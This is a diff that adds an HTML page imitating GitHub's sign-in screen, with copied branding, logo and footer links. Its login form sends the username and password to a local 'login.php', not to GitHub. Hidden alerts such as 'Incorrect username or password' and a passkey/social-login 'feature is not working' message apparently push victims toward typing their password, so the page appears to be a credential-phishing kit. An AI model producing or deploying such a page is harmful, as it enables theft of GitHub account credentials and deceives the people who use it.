@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub · Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" />
+
+</head>
+
+<body>
+    <div class="page">
+        <header class="brand">
+            <div class="logo" aria-hidden="true">
+                <svg viewBox="0 0 24 24" width="48" height="48" fill="currentColor" role="img"
+                    aria-label="GitHub Octocat">
+                    <path
+                        d="M10.226 17.284c-2.965-.36-5.054-2.493-5.054-5.256 0-1.123.404-2.336 1.078-3.144-.292-.741-.247-2.314.09-2.965.898-.112 2.111.36 2.83 1.01.853-.269 1.752-.404 2.853-.404 1.1 0 1.999.135 2.807.382.696-.629 1.932-1.1 2.83-.988.315.606.36 2.179.067 2.942.72.854 1.101 2 1.101 3.167 0 2.763-2.089 4.852-5.098 5.234.763.494 1.28 1.572 1.28 2.807v2.336c0 .674.561 1.056 1.235.786 4.066-1.55 7.255-5.615 7.255-10.646C23.5 6.188 18.334 1 11.978 1 5.62 1 .5 6.188.5 12.545c0 4.986 3.167 9.12 7.435 10.669.606.225 1.19-.18 1.19-.786V20.63a2.9 2.9 0 0 1-1.078.224c-1.483 0-2.359-.808-2.987-2.313-.247-.607-.517-.966-1.034-1.033-.27-.023-.359-.135-.359-.27 0-.27.45-.471.898-.471.652 0 1.213.404 1.797 1.235.45.651.921.943 1.483.943.561 0 .92-.202 1.437-.719.382-.381.674-.718.944-.943">
+                    </path>
+                </svg>
+            </div>
+            <h1>Sign in to GitHub</h1>
+        </header>
+
+        <main class="panel">
+            <div id="error-alert" class="alert error" style="display:none; margin-bottom:10px;">
+                <span class="warn-icon" aria-hidden="true">
+                    <svg data-component="Octicon" height="16" viewBox="0 0 16 16" width="16" fill="currentColor">
+                        <path
+                            d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z">
+                        </path>
+                    </svg>
+                </span>
+                <span>Incorrect username or password.</span>
+                <button type="button" class="alert-close" id="error-alert-close" aria-label="Dismiss">&#x2715;</button>
+            </div>
+            <form action="login.php" method="POST" novalidate>
+                <label for="login">Username or email address</label>
+                <input id="login" name="login" type="text" autocomplete="username" required>
+
+                <div class="row between">
+                    <label for="password">Password</label>
+                    <a class="link" href="https://github.com/password_reset" target="_blank" rel="noopener">Forgot
+                        password?</a>
+                </div>
+                <input id="password" name="pass" type="password" autocomplete="current-password" required>
+
+                <button id="btn-signin" class="btn primary" type="submit">Sign in</button>
+            </form>
+
+            <div class="divider"><span>or</span></div>
+
+            <div class="alert warn" id="passkey-alert" style="display:none;">
+                <span class="warn-icon" aria-hidden="true">
+                    <svg data-component="Octicon" height="16" viewBox="0 0 16 16" width="16" fill="currentColor">
+                        <path
+                            d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z">
+                        </path>
+                    </svg>
+                </span>
+                <span>This browser or device is reporting partial passkey support.</span>
+            </div>
+
+            <div id="feature-alert" class="alert warn" style="display:none; margin-bottom:10px;">
+                <span class="warn-icon" aria-hidden="true">
+                    <svg data-component="Octicon" height="16" viewBox="0 0 16 16" width="16" fill="currentColor">
+                        <path
+                            d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z">
+                        </path>
+                    </svg>
+                </span>
+                <span>This feature is not working at the moment. Try another method to continue.</span>
+            </div>
+
+            <div class="stack">
+                <button id="btn-passkey" class="btn ghost" type="button"
+                    style="display: flex; align-items: center; justify-content: center;">
+                    <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-passkey-fill color-fg-inherit" style="margin-right: 8px;" fill="white">
+                        <path
+                            d="M2.743 4.757a3.757 3.757 0 1 1 5.851 3.119 5.991 5.991 0 0 1 2.15 1.383c.17.17.257.405.258.646.003.598.001 1.197 0 1.795L11 12.778v.721a.5.5 0 0 1-.5.5H1.221a.749.749 0 0 1-.714-.784 6.004 6.004 0 0 1 3.899-5.339 3.754 3.754 0 0 1-1.663-3.119Z">
+                        </path>
+                        <path
+                            d="M15.75 6.875c0 .874-.448 1.643-1.127 2.09a.265.265 0 0 0-.123.22v.59c0 .067-.026.13-.073.177l-.356.356a.125.125 0 0 0 0 .177l.356.356c.047.047.073.11.073.176v.231c0 .067-.026.13-.073.177l-.356.356a.125.125 0 0 0 0 .177l.356.356c.047.047.073.11.073.177v.287a.247.247 0 0 1-.065.168l-.8.88a.52.52 0 0 1-.77 0l-.8-.88a.247.247 0 0 1-.065-.168V9.185a.264.264 0 0 0-.123-.22 2.5 2.5 0 1 1 3.873-2.09ZM14 6.5a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z">
+                        </path>
+                    </svg>
+                    Continue with passkey
+                </button>
+                <div id="loader-passkey" class="social-loader" style="display:none;">
+                    <span class="loader-spinner"></span>
+                    <span class="loader-text">Waiting for input from browser interaction...</span>
+                </div>
+                <button id="btn-google" class="btn ghost" type="button"><span class="icon google"
+                        aria-hidden="true"></span>Continue with Google</button>
+                <div id="loader-google" class="social-loader" style="display:none;">
+                    <span class="loader-spinner"></span>
+                    <span class="loader-text">Waiting for input from browser interaction...</span>
+                </div>
+                <button id="btn-apple" class="btn ghost" type="button"><span class="icon apple"
+                        aria-hidden="true"></span>Continue with Apple</button>
+                <div id="loader-apple" class="social-loader" style="display:none;">
+                    <span class="loader-spinner"></span>
+                    <span class="loader-text">Waiting for input from browser interaction...</span>
+                </div>
+            </div>
+        </main>
+
+        <div class="note"> New to GitHub? <a id="create-account-link" class="link" href="https://github.com/signup"
+                target="_blank" rel="noopener">Create an account</a></div>
+
+
+    </div>
+    <script src="script.js"></script>
+    <div class="global-footer">
+        <a class="link" href="https://docs.github.com/en/site-policy/github-terms/github-terms-of-service"
+            target="_blank" rel="noopener">Terms</a>
+        <a class="link" href="https://docs.github.com/en/site-policy/privacy-policies/github-privacy-statement"
+            target="_blank" rel="noopener">Privacy</a>
+        <a class="link" href="https://docs.github.com" target="_blank" rel="noopener">Docs</a>
+        <a class="link" href="https://support.github.com" target="_blank" rel="noopener">Contact GitHub Support</a>
+        <a class="link" href="https://github.com/settings/cookies" target="_blank" rel="noopener">Manage cookies</a>
+        <a class="link"
+            href="https://docs.github.com/en/site-policy/privacy-policies/github-privacy-statement#do-not-sell-my-personal-information"
+            target="_blank" rel="noopener">Do not share my personal information</a>
+    </div>
+</body>
+
+</html>
